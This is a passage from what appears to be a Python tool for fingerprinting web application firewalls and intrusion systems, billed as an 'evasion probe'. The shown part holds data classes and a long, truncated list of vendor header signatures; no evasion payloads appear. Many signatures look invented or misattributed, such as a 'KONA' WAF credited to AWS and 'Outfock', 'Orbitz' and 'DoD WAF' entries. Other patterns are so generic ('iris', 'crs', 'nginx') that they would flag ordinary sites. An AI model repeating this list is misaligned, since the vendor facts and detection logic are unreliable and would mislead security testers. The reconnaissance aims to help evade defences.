#!/usr/bin/env python3
"""
WAF/IDS/IPS Signature & Heuristic Behavioral Evasion Probe
Author: Dwi Joko Purwanto 
Version: 1.0.0
Description:
    A comprehensive tool to detect and analyze Web Application Firewalls (WAF),
    Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS).
    
    Features:
    - Signature-based detection (HTTP headers, status codes, body patterns)
    - Behavioral analysis (rate limiting, IP blocking, challenge pages)
    - Passive fingerprinting (via User-Agent and server response anomalies)
    - Active probing with common evasion payloads
    - JSON output for integration with CI/CD pipelines or reporting tools
    
Usage:
    python waf_detector.py --target https://example.com [--timeout 10] [--threads 5] [--verbose]
    
Dependencies:
    requests>=2.28.0
    beautifulsoup4>=4.11.0
    urllib3>=1.26.0
"""

import sys
import os
import json
import time
import logging
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Set, Tuple, Any
from enum import Enum
from urllib.parse import urlparse, urlencode, quote_plus
from urllib.parse import parse_qs
from collections import Counter

try:
    import requests
    from bs4 import BeautifulSoup
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError as e:
    print(f"Error: Missing required dependency: {e}")
    print("Install dependencies with: pip install requests beautifulsoup4")
    sys.exit(1)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)


class DetectionMethod(Enum):
    """Enumeration of detection methods used."""
    HEADER_SIGNATURE = "header_signature"
    BODY_SIGNATURE = "body_signature"
    STATUS_CODE = "status_code"
    BEHAVIORAL = "behavioral"
    CHALLENGE_PAGE = "challenge_page"
    RATE_LIMITING = "rate_limiting"
    IP_BLOCKING = "ip_blocking"
    USER_AGENT_FINGERPRINT = "user_agent_fingerprint"
    RESPONSE_TIME_ANOMALY = "response_time_anomaly"
    CONTENT_TYPE_ANOMALY = "content_type_anomaly"


@dataclass
class WAFSignature:
    """Represents a known WAF signature pattern."""
    name: str
    vendor: str
    type_: DetectionMethod
    pattern: str
    case_sensitive: bool = False
    description: str = ""
    
    def matches(self, text: str) -> bool:
        """Check if the pattern matches the given text."""
        if not text:
            return False
        if self.case_sensitive:
            return self.pattern in text
        else:
            return self.pattern.lower() in text.lower()


@dataclass
class ProbeResult:
    """Stores results from a single probe/test."""
    test_name: str
    payload: str
    url: str
    method: str
    status_code: int
    headers: Dict[str, str]
    body_snippet: str
    response_time: float
    detected: bool
    detection_method: DetectionMethod
    details: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None


@dataclass
class WAFProfile:
    """Aggregated profile of detected WAF characteristics."""
    waf_name: str
    confidence: float
    detection_methods: List[DetectionMethod]
    signatures_matched: List[str]
    behavioral_traits: List[str]
    rate_limit_detected: bool
    ip_blocking_detected: bool
    challenge_page_detected: bool
    response_headers: Dict[str, str]
    last_updated: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert profile to dictionary for JSON serialization."""
        result = asdict(self)
        result['detection_methods'] = [m.value for m in self.detection_methods]
        result['last_updated'] = time.strftime('%Y-%m-%d %H:%M:%S')
        return result


class WAFDetector:
    """
    Main class for detecting WAF/IDS/IPS systems.
    
    Uses a combination of signature matching, behavioral analysis,
    and heuristic probes to identify web security appliances.
    """
    
    # Known WAF signatures based on community research and public disclosures
    KNOWN_SIGNATURES = [
        WAFSignature(
            name="Cloudflare",
            vendor="Cloudflare Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cloudflare",
            case_sensitive=False,
            description="Cloudflare WAF uses 'cloudflare' in various headers and response bodies."
        ),
        WAFSignature(
            name="Cloudflare Ray ID",
            vendor="Cloudflare Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cf-ray",
            case_sensitive=False,
            description="Cloudflare includes unique Ray IDs in responses."
        ),
        WAFSignature(
            name="Cloudflare Firewall",
            vendor="Cloudflare Inc.",
            type_=DetectionMethod.BODY_SIGNATURE,
            pattern="__cfduid",
            case_sensitive=False,
            description="Cloudflare sets __cfduid cookies for firewall operations."
        ),
        WAFSignature(
            name="Akamai",
            vendor="Akamai Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="akamai-gatekeeper",
            case_sensitive=False,
            description="Akamai WAF often includes gatekeeper headers."
        ),
        WAFSignature(
            name="Akamai Origin Server",
            vendor="Akamai Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="x-akamai-transformed",
            case_sensitive=False,
            description="Akamai transforms requests and adds specific headers."
        ),
        WAFSignature(
            name="F5 BIG-IP",
            vendor="F5 Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="bigipserver",
            case_sensitive=False,
            description="F5 BIG-IP load balancers/WAFs add BigIPServer headers."
        ),
        WAFSignature(
            name="F5 BIG-IP Cookie",
            vendor="F5 Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="BIGipServer",
            case_sensitive=True,
            description="F5 BIG-IP sets BIGipServer cookies."
        ),
        WAFSignature(
            name="ModSecurity",
            vendor="SpiderLabs",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="mod_security",
            case_sensitive=False,
            description="ModSecurity is an open-source WAF that can leave headers."
        ),
        WAFSignature(
            name="ModSecurity Rule ID",
            vendor="SpiderLabs",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="modsecurity-rule",
            case_sensitive=False,
            description="ModSecurity may include rule IDs in responses."
        ),
        WAFSignature(
            name="Imperva Incapsula",
            vendor="Imperva Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="incap_ses",
            case_sensitive=False,
            description="Imperva Incapsua WAF sets session cookies."
        ),
        WAFSignature(
            name="Imperva Cloud",
            vendor="Imperva Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cp_cpn_id",
            case_sensitive=False,
            description="Imperva Cloud WAF includes custom proxy headers."
        ),
        WAFSignature(
            name="AWS WAF",
            vendor="Amazon Web Services",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="awselb/",
            case_sensitive=False,
            description="AWS WAF often runs behind Elastic Load Balancers."
        ),
        WAFSignature(
            name="AWS ALB Headers",
            vendor="Amazon Web Services",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="x-amzn-",
            case_sensitive=False,
            description="AWS services include x-amzn-* headers."
        ),
        WAFSignature(
            name="Nginx WAF",
            vendor="Nginx Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="nginx",
            case_sensitive=False,
            description="Nginx servers may have WAF modules enabled."
        ),
        WAFSignature(
            name="Apache ModSecurity",
            vendor="Apache Software Foundation",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="server: apache",
            case_sensitive=False,
            description="Apache web server with ModSecurity module."
        ),
        WAFSignature(
            name="Palo Alto Networks",
            vendor="Palo Alto Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="palo-alto",
            case_sensitive=False,
            description="Palo Alto Next-Gen Firewalls may expose headers."
        ),
        WAFSignature(
            name="Fortinet FortiWeb",
            vendor="Fortinet",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="fortiwaf",
            case_sensitive=False,
            description="Fortinet FortiWeb WAF indicators."
        ),
        WAFSignature(
            name="Reblaze",
            vendor="Reblaze",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="reblaze-firewall",
            case_sensitive=False,
            description="Reblaze WAF headers."
        ),
        WAFSignature(
            name="Sucuri CloudProxy",
            vendor="Sucuri Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="sucuri-cloudproxy",
            case_sensitive=False,
            description="Sucuri Web Application Firewall headers."
        ),
        WAFSignature(
            name="DotDefender",
            vendor="Applicure Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="dotdefender",
            case_sensitive=False,
            description="DotDefender WAF headers."
        ),
        WAFSignature(
            name="Aldyn Access Guard",
            vendor="Aldyn",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="access-guard",
            case_sensitive=False,
            description="Aldyn Access Guard WAF headers."
        ),
        WAFSignature(
            name="BinarySEC",
            vendor="BinarySEC",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="binarysec",
            case_sensitive=False,
            description="BinarySEC CDN/WAF headers."
        ),
        WAFSignature(
            name="CacheFly",
            vendor="CacheFly",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cflowf",
            case_sensitive=False,
            description="CacheFly WAF/CDN headers."
        ),
        WAFSignature(
            name="Fastly",
            vendor="Fastly Inc.",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="fastly",
            case_sensitive=False,
            description="Fastly CDN/WAF headers."
        ),
        WAFSignature(
            name="Google Cloud Armor",
            vendor="Google Cloud",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="x-goog-",
            case_sensitive=False,
            description="Google Cloud Armor WAF headers."
        ),
        WAFSignature(
            name="Huawei Cloud WAF",
            vendor="Huawei Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="huawei-cloudwaf",
            case_sensitive=False,
            description="Huawei Cloud WAF headers."
        ),
        WAFSignature(
            name="IBM Security Guard",
            vendor="IBM",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ibm-security",
            case_sensitive=False,
            description="IBM Security Gateway/WAF headers."
        ),
        WAFSignature(
            name="Juniper SRX",
            vendor="Juniper Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="juniper",
            case_sensitive=False,
            description="Juniper SRX firewalls may expose headers."
        ),
        WAFSignature(
            name="Kemp LoadMaster",
            vendor="Kemp Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="kemp-loadbalancer",
            case_sensitive=False,
            description="Kemp LoadMaster WAF headers."
        ),
        WAFSignature(
            name="Radware AppWall",
            vendor="Radware",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="radware",
            case_sensitive=False,
            description="Radware AppWall WAF headers."
        ),
        WAFSignature(
            name="SiteLock",
            vendor="SiteLock",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="sitelock-info",
            case_sensitive=False,
            description="SiteLock WAF headers."
        ),
        WAFSignature(
            name="Stingray",
            vendor="Riverbed Technology",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="stingray",
            case_sensitive=False,
            description="Riverbed Stingray WAF headers."
        ),
        WAFSignature(
            name="Tencent Cloud WAF",
            vendor="Tencent",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="tencent-cloud",
            case_sensitive=False,
            description="Tencent Cloud WAF headers."
        ),
        WAFSignature(
            name="Varnish Cache WAF",
            vendor="Varnish",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="varnish",
            case_sensitive=False,
            description="Varnish cache with WAF capabilities."
        ),
        WAFSignature(
            name="WebKnight",
            vendor="AQTRONIX",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webknight",
            case_sensitive=False,
            description="WebKnight WAF headers."
        ),
        WAFSignature(
            name="Wordfence",
            vendor="Feedjit",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="wordfence",
            case_sensitive=False,
            description="Wordfence WordPress WAF headers."
        ),
        WAFSignature(
            name="Zscaler",
            vendor="Zscaler",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="zscaler",
            case_sensitive=False,
            description="Zscaler Cloud WAF headers."
        ),
        WAFSignature(
            name="Alibaba Cloud WAF",
            vendor="Alibaba Group",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ali-cdn",
            case_sensitive=False,
            description="Alibaba Cloud WAF headers."
        ),
        WAFSignature(
            name="Baidu Cloud WAF",
            vendor="Baidu",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="baidu",
            case_sensitive=False,
            description="Baidu Cloud WAF headers."
        ),
        WAFSignature(
            name="ChinaNetCenter",
            vendor="ChinaNetCenter",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="wpserver",
            case_sensitive=False,
            description="ChinaNetCenter WAF headers."
        ),
        WAFSignature(
            name="Comodo WAF",
            vendor="Comodo",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="comodo",
            case_sensitive=False,
            description="Comodo WAF headers."
        ),
        WAFSignature(
            name="DenyAll",
            vendor="Compuware",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="denyall",
            case_sensitive=False,
            description="Compuware DenyAll WAF headers."
        ),
        WAFSignature(
            name="EdgeCast",
            vendor="Verizon Digital Media",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="edgecast",
            case_sensitive=False,
            description="EdgeCast WAF/CDN headers."
        ),
        WAFSignature(
            name="GoDaddy WAF",
            vendor="GoDaddy",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="godaddy",
            case_sensitive=False,
            description="GoDaddy WAF headers."
        ),
        WAFSignature(
            name="Hulk WAF",
            vendor="Unknown",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="hulk",
            case_sensitive=False,
            description="Hulk WAF headers."
        ),
        WAFSignature(
            name="Iptable",
            vendor="Iptable",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="iptable",
            case_sensitive=False,
            description="Iptable WAF headers."
        ),
        WAFSignature(
            name="KeyCDN",
            vendor="KeyCDN",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="keycdn",
            case_sensitive=False,
            description="KeyCDN WAF headers."
        ),
        WAFSignature(
            name="Litespeed WAF",
            vendor="LiteSpeed Technologies",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="litespeed",
            case_sensitive=False,
            description="LiteSpeed WAF headers."
        ),
        WAFSignature(
            name="MaxCDN",
            vendor="MaxCDN",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="maxcdn",
            case_sensitive=False,
            description="MaxCDN WAF headers."
        ),
        WAFSignature(
            name="Nemesida WAF",
            vendor="Dr.Web",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="nemesida",
            case_sensitive=False,
            description="Nemesida WAF headers."
        ),
        WAFSignature(
            name="NSFOCUS",
            vendor="NSFOCUS",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="nsfocus",
            case_sensitive=False,
            description="NSFOCUS WAF headers."
        ),
        WAFSignature(
            name="PentaWAF",
            vendor="PentaWAF",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="pentawaf",
            case_sensitive=False,
            description="PentaWAF headers."
        ),
        WAFSignature(
            name="Qiniu Cloud",
            vendor="Qiniu",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="qiniucdn",
            case_sensitive=False,
            description="Qiniu Cloud WAF headers."
        ),
        WAFSignature(
            name="Safe3 WAF",
            vendor="Safe3",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="safe3",
            case_sensitive=False,
            description="Safe3 WAF headers."
        ),
        WAFSignature(
            name="SecuPress",
            vendor="SecuPress",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="securpress",
            case_sensitive=False,
            description="SecuPress WAF headers."
        ),
        WAFSignature(
            name="Trend Micro",
            vendor="Trend Micro",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="trendmicro",
            case_sensitive=False,
            description="Trend Micro WAF headers."
        ),
        WAFSignature(
            name="UA-WAF",
            vendor="Unknown",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ua-waf",
            case_sensitive=False,
            description="Generic UA WAF headers."
        ),
        WAFSignature(
            name="UCloud",
            vendor="UCloud",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ucloud",
            case_sensitive=False,
            description="UCloud WAF headers."
        ),
        WAFSignature(
            name="WebSeal",
            vendor="IBM",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="webseal",
            case_sensitive=False,
            description="IBM WebSeal WAF headers."
        ),
        WAFSignature(
            name="XuanWuDB",
            vendor="XuanWu",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="xuanwu",
            case_sensitive=False,
            description="XuanWu DB WAF headers."
        ),
        WAFSignature(
            name="Yundun",
            vendor="Yundun",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="yundun",
            case_sensitive=False,
            description="Yundun WAF headers."
        ),
        WAFSignature(
            name="Yunsuo",
            vendor="Yunsuo",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="yunsuo",
            case_sensitive=False,
            description="Yunsuo WAF headers."
        ),
        WAFSignature(
            name="Zenedge",
            vendor="Zenedge",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="zenedge",
            case_sensitive=False,
            description="Zenedge WAF headers."
        ),
        WAFSignature(
            name="360 Web Application Firewall",
            vendor="Qihoo 360",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="360wzws",
            case_sensitive=False,
            description="360 Web Application Firewall headers."
        ),
        WAFSignature(
            name="Aliyun WAF",
            vendor="Alibaba Cloud",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="alicloud",
            case_sensitive=False,
            description="Alibaba Cloud WAF headers."
        ),
        WAFSignature(
            name="Anquanbao",
            vendor="Anquanbao",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="anquanbao",
            case_sensitive=False,
            description="Anquanbao WAF headers."
        ),
        WAFSignature(
            name="Barracuda",
            vendor="Barracuda Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="barracuda",
            case_sensitive=False,
            description="Barracuda WAF headers."
        ),
        WAFSignature(
            name="BigIP F5",
            vendor="F5 Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="bigip",
            case_sensitive=False,
            description="F5 BIG-IP WAF headers."
        ),
        WAFSignature(
            name="BitNinja",
            vendor="BitNinja",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="bitninja",
            case_sensitive=False,
            description="BitNinja WAF headers."
        ),
        WAFSignature(
            name="BlockDoS",
            vendor="BlockDoS",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="blockdos",
            case_sensitive=False,
            description="BlockDoS WAF headers."
        ),
        WAFSignature(
            name="BurstCDN",
            vendor="BurstCDN",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="burstcdn",
            case_sensitive=False,
            description="BurstCDN WAF headers."
        ),
        WAFSignature(
            name="CD7ion",
            vendor="CD7ion",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cd7ion",
            case_sensitive=False,
            description="CD7ion WAF headers."
        ),
        WAFSignature(
            name="Chuangyu",
            vendor="Chuangyu",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="chuangyu",
            case_sensitive=False,
            description="Chuangyu WAF headers."
        ),
        WAFSignature(
            name="Cloudfront",
            vendor="Amazon Web Services",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cloudfront",
            case_sensitive=False,
            description="AWS CloudFront WAF headers."
        ),
        WAFSignature(
            name="CrawlProtect",
            vendor="CrawlProtect",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="crawlprotect",
            case_sensitive=False,
            description="CrawlProtect WAF headers."
        ),
        WAFSignature(
            name="Cyber Protector",
            vendor="Cyber Protector",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="cyberprotector",
            case_sensitive=False,
            description="Cyber Protector WAF headers."
        ),
        WAFSignature(
            name="DataPower",
            vendor="IBM",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="datamirror",
            case_sensitive=False,
            description="IBM DataPower WAF headers."
        ),
        WAFSignature(
            name="DDoS-Guard",
            vendor="DDoS-Guard",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ddos-guard",
            case_sensitive=False,
            description="DDoS-Guard WAF headers."
        ),
        WAFSignature(
            name="Distil",
            vendor="Distil Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="distil",
            case_sensitive=False,
            description="Distil Networks WAF headers."
        ),
        WAFSignature(
            name="DoD WAF",
            vendor="Department of Defense",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="dod-waf",
            case_sensitive=False,
            description="US DoD WAF headers."
        ),
        WAFSignature(
            name="DS-X",
            vendor="DS-X",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ds-x",
            case_sensitive=False,
            description="DS-X WAF headers."
        ),
        WAFSignature(
            name="DynamicWeb",
            vendor="DynamicWeb",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="dynamicweb",
            case_sensitive=False,
            description="DynamicWeb WAF headers."
        ),
        WAFSignature(
            name="eSqure",
            vendor="eSqure",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="esqure",
            case_sensitive=False,
            description="eSqure WAF headers."
        ),
        WAFSignature(
            name="Exabeam",
            vendor="Exabeam",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="exabeam",
            case_sensitive=False,
            description="Exabeam WAF headers."
        ),
        WAFSignature(
            name="F5 ASM",
            vendor="F5 Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="f5 asm",
            case_sensitive=False,
            description="F5 Application Security Manager headers."
        ),
        WAFSignature(
            name="FirePass",
            vendor="F5 Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="firepass",
            case_sensitive=False,
            description="F5 FirePass WAF headers."
        ),
        WAFSignature(
            name="FortiGate",
            vendor="Fortinet",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="fortigate",
            case_sensitive=False,
            description="Fortinet FortiGate WAF headers."
        ),
        WAFSignature(
            name="Gigamon",
            vendor="Gigamon",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="gigamon",
            case_sensitive=False,
            description="Gigamon WAF headers."
        ),
        WAFSignature(
            name="GlobalCDN",
            vendor="GlobalCDN",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="globalcdn",
            case_sensitive=False,
            description="GlobalCDN WAF headers."
        ),
        WAFSignature(
            name="GreenSQL",
            vendor="GreenSQL",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="greensql",
            case_sensitive=False,
            description="GreenSQL WAF headers."
        ),
        WAFSignature(
            name="HSphere",
            vendor="Parallels",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="hsphere",
            case_sensitive=False,
            description="HSphere WAF headers."
        ),
        WAFSignature(
            name="Hyperguard",
            vendor="Art of Defence",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="hyperguard",
            case_sensitive=False,
            description="Art of Defence Hyperguard WAF headers."
        ),
        WAFSignature(
            name="INFINITi",
            vendor="INFINITi",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="infiniti",
            case_sensitive=False,
            description="INFINITi WAF headers."
        ),
        WAFSignature(
            name="Instart Logic",
            vendor="Instart Logic",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="instart",
            case_sensitive=False,
            description="Instart Logic WAF headers."
        ),
        WAFSignature(
            name="IronPort",
            vendor="Cisco",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="ironport",
            case_sensitive=False,
            description="Cisco IronPort WAF headers."
        ),
        WAFSignature(
            name="Iris",
            vendor="Iris",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="iris",
            case_sensitive=False,
            description="Iris WAF headers."
        ),
        WAFSignature(
            name="Jiasu",
            vendor="Jiasu",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="jiasu",
            case_sensitive=False,
            description="Jiasu WAF headers."
        ),
        WAFSignature(
            name="Juniper Netscreen",
            vendor="Juniper Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="netscreen",
            case_sensitive=False,
            description="Juniper Netscreen WAF headers."
        ),
        WAFSignature(
            name="KONA",
            vendor="Amazon Web Services",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="kona",
            case_sensitive=False,
            description="AWS KONA WAF headers."
        ),
        WAFSignature(
            name="LEADTECH",
            vendor="LEADTECH",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="leadtech",
            case_sensitive=False,
            description="LEADTECH WAF headers."
        ),
        WAFSignature(
            name="Linksys",
            vendor="Linksys",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="linksys",
            case_sensitive=False,
            description="Linksys WAF headers."
        ),
        WAFSignature(
            name="Malcare",
            vendor="BlogVault",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="malcare",
            case_sensitive=False,
            description="Malcare WAF headers."
        ),
        WAFSignature(
            name="Mission Control",
            vendor="Mission Control",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="missioncontrol",
            case_sensitive=False,
            description="Mission Control WAF headers."
        ),
        WAFSignature(
            name="ModSecurity CRS",
            vendor="SpiderLabs",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="crs",
            case_sensitive=False,
            description="ModSecurity Core Rule Set headers."
        ),
        WAFSignature(
            name="MultiShield",
            vendor="MultiShield",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="multishield",
            case_sensitive=False,
            description="MultiShield WAF headers."
        ),
        WAFSignature(
            name="NetContinuum",
            vendor="NetContinuum",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="netcontinuum",
            case_sensitive=False,
            description="NetContinuum WAF headers."
        ),
        WAFSignature(
            name="NetScaler",
            vendor="Citrix",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="netscaler",
            case_sensitive=False,
            description="Citrix NetScaler WAF headers."
        ),
        WAFSignature(
            name="Newdefend",
            vendor="Newdefend",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="newdefend",
            case_sensitive=False,
            description="Newdefend WAF headers."
        ),
        WAFSignature(
            name="NSFocus IDS",
            vendor="NSFOCUS",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="nsfocus ids",
            case_sensitive=False,
            description="NSFOCUS IDS headers."
        ),
        WAFSignature(
            name="OpenDNS",
            vendor="Cisco",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="opendns",
            case_sensitive=False,
            description="OpenDNS WAF headers."
        ),
        WAFSignature(
            name="Orbitz",
            vendor="Orbitz",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="orbitz",
            case_sensitive=False,
            description="Orbitz WAF headers."
        ),
        WAFSignature(
            name="Outfock",
            vendor="Outfock",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="outfock",
            case_sensitive=False,
            description="Outfock WAF headers."
        ),
        WAFSignature(
            name="Palo Alto PAN-W",
            vendor="Palo Alto Networks",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="pan-w",
            case_sensitive=False,
            description="Palo Alto PAN-W headers."
        ),
        WAFSignature(
            name="PerimeterX",
            vendor="PerimeterX",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="perimeterx",
            case_sensitive=False,
            description="PerimeterX WAF headers."
        ),
        WAFSignature(
            name="Plesk",
            vendor="Parallels",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="plesk",
            case_sensitive=False,
            description="Plesk WAF headers."
        ),
        WAFSignature(
            name="Profense",
            vendor="ArmorLogic",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="profense",
            case_sensitive=False,
            description="ArmorLogic Profense WAF headers."
        ),
        WAFSignature(
            name="Proventia",
            vendor="IBM",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="proventia",
            case_sensitive=False,
            description="IBM Proventia WAF headers."
        ),
        WAFSignature(
            name="QuickDefense",
            vendor="QuickDefense",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="quickdefense",
            case_sensitive=False,
            description="QuickDefense WAF headers."
        ),
        WAFSignature(
            name="RSFirewall",
            vendor="RSFirewall",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="rsfirewall",
            case_sensitive=False,
            description="RSFirewall WAF headers."
        ),
        WAFSignature(
            name="Sabre",
            vendor="Sabre",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="sabre",
            case_sensitive=False,
            description="Sabre WAF headers."
        ),
        WAFSignature(
            name="SafeDomain",
            vendor="SafeDomain",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="safedomain",
            case_sensitive=False,
            description="SafeDomain WAF headers."
        ),
        WAFSignature(
            name="Safeline",
            vendor="Chaitin",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="safeline",
            case_sensitive=False,
            description="Chaitin Safeline WAF headers."
        ),
        WAFSignature(
            name="Secure Entry",
            vendor="Secure Entry",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="secureentry",
            case_sensitive=False,
            description="Secure Entry WAF headers."
        ),
        WAFSignature(
            name="SecureSphere",
            vendor="Imperva",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="securesphere",
            case_sensitive=False,
            description="Imperva SecureSphere WAF headers."
        ),
        WAFSignature(
            name="SecurityInfo",
            vendor="SecurityInfo",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="securityinfo",
            case_sensitive=False,
            description="SecurityInfo WAF headers."
        ),
        WAFSignature(
            name="Squid Proxy WAF",
            vendor="Squid",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="squid",
            case_sensitive=False,
            description="Squid proxy with WAF capabilities."
        ),
        WAFSignature(
            name="Stackpath",
            vendor="StackPath",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="stackpath",
            case_sensitive=False,
            description="StackPath WAF headers."
        ),
        WAFSignature(
            name="SurfaceWatch",
            vendor="SurfaceWatch",
            type_=DetectionMethod.HEADER_SIGNATURE,
            pattern="surfacewatch",
            case_sensitive=False,
            description="SurfaceWatch WAF headers."
